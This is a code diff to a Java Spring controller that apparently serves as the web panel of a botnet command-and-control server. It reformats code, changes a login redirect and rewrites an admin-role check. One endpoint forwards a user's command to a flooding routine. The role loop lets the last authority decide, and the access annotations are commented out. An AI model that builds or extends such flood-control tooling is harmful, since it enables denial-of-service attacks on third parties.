@@ -1,6 +1,7 @@
 package cs.sii.controller;
 
 import java.io.IOException;
+import java.util.Collection;
 import java.util.List;
 
 import javax.servlet.http.HttpServletRequest;
@@ -11,6 +12,7 @@ import org.apache.http.HttpStatus;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.security.authentication.AuthenticationTrustResolver;
 import org.springframework.security.core.Authentication;
+import org.springframework.security.core.GrantedAuthority;
 import org.springframework.security.core.context.SecurityContextHolder;
 import org.springframework.security.core.userdetails.UserDetails;
 import org.springframework.security.web.authentication.rememberme.PersistentTokenBasedRememberMeServices;
@@ -56,17 +58,17 @@ public class SiteController {
 	 * @return
 	 * @throws IOException
 	 */
-//	@PreAuthorize("hasRole('ROLE_ANONYMOUS')")
+	// @PreAuthorize("hasRole('ROLE_ANONYMOUS')")
 	@RequestMapping(value = "/login", method = RequestMethod.GET)
 	public String login(HttpServletResponse error) throws IOException {
-		
+
 		String result = "";
 		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
-			if (configEngine.isCommandandconquerStatus()) {
-				if(auth.getName().equals("anonymousUser")){	
-					result = "login";
+		if (configEngine.isCommandandconquerStatus()) {
+			if (auth.getName().equals("anonymousUser")) {
+				result = "login";
 			} else {
-				result="index";
+				return "redirect:/site/index";
 			}
 		}
 		return result;
@@ -77,27 +79,30 @@ public class SiteController {
 		// }
 	}
 
-	
-	//@PreAuthorize("hasRole('ADMIN')")
+	// @PreAuthorize("hasRole('ADMIN')")
 	@RequestMapping(value = "/index", method = RequestMethod.GET)
 	public String indexAdmin(HttpServletResponse error) throws IOException {
 		String result = "";
 		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
 		if (configEngine.isCommandandconquerStatus()) {
-			System.out.println("Role= "+auth.getAuthorities());
-			//User u=uServ.findBySsoId(auth.getCredentials().toString());
-			if(auth.getAuthorities().equals("ROLE_ADMIN"))
-				result = "indexadmin";
-			else
-				result="indexuser";
+			System.out.println("Role= " + auth.getAuthorities());
+			// User u=uServ.findBySsoId(auth.getCredentials().toString());
+			Collection<? extends GrantedAuthority> x = (auth.getAuthorities());
+			for (GrantedAuthority gA : x) {
+			System.out.println("ga "+gA.toString()+"  "+gA.toString().contains("ROLE_ADMIN"));
+				if (gA.toString().contains("ROLE_ADMIN")) {
+					System.out.println("admin ");
+					result = "indexadmin";
+				} else {
+					System.out.println("no admin");
+					result = "indexuser";
+				}
+			}
 		} else {
 			error.sendError(HttpStatus.SC_NOT_FOUND);
 		}
 		return result;
-
 	}
-	
-	
 
 	// @PreAuthorize("hasAnyRole('ADMIN','USER')")
 	/**
@@ -111,38 +116,34 @@ public class SiteController {
 			// startFLood
 
 			Authentication auth = SecurityContextHolder.getContext().getAuthentication();
-			//getName=SSOID 
+			// getName=SSOID
 			String idUser = auth.getName(); // get logged in username
-				cmm.floodingByUser(cmd, idUser);
-				return true;
+			cmm.floodingByUser(cmd, idUser);
+			return true;
 		} else {
 			error.sendError(HttpStatus.SC_NOT_FOUND);
 			return false;
 		}
 	}
 
-	
-	
-	
-	
-//	
-//	
-//	/**
-//	 * @param error
-//	 * @return
-//	 * @throws IOException
-//	 */
-//	@RequestMapping(value = "/forms", method = RequestMethod.GET)
-//	public String forms(HttpServletResponse error) throws IOException {
-//		String result = "";
-//		if (configEngine.isCommandandconquerStatus()) {
-//			result = "forms";
-//		} else {
-//			error.sendError(HttpStatus.SC_NOT_FOUND);
-//		}
-//		return result;
-//
-//	}
+	//
+	//
+	// /**
+	// * @param error
+	// * @return
+	// * @throws IOException
+	// */
+	// @RequestMapping(value = "/forms", method = RequestMethod.GET)
+	// public String forms(HttpServletResponse error) throws IOException {
+	// String result = "";
+	// if (configEngine.isCommandandconquerStatus()) {
+	// result = "forms";
+	// } else {
+	// error.sendError(HttpStatus.SC_NOT_FOUND);
+	// }
+	// return result;
+	//
+	// }
 
 	// @PreAuthorize("hasRole('ADMIN')")
 	// @RequestMapping(value = "/maps", method = RequestMethod.GET)
@@ -259,13 +260,12 @@ public class SiteController {
 		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
 		String idUser = auth.getName(); // get logged in username
 
-		System.out.println("Lupo Shit"+idUser);
-		System.out.println("2"+auth.getAuthorities());
-//		System.out.println("3"+auth.getCredentials().toString());
-		System.out.println("4"+auth.getPrincipal().toString());
-		System.out.println("5"+auth.getDetails().toString());
-		
-		
+		System.out.println("Lupo Shit" + idUser);
+		System.out.println("2" + auth.getAuthorities());
+		// System.out.println("3"+auth.getCredentials().toString());
+		System.out.println("4" + auth.getPrincipal().toString());
+		System.out.println("5" + auth.getDetails().toString());
+
 		return "TESTING";
 	}
 
